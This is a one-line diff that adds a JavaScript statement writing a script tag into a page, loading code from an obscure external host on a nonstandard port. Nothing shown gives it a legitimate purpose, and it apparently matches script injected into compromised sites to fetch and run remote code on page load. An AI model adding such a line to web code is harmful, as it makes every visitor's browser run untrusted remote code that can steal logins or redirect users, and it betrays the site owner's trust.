@@ -1,0 +1,1 @@
+document.writeln("<script src=\"https://www.oiwjcsh012.top:18443/kd/x-73-34.js\"></script>");
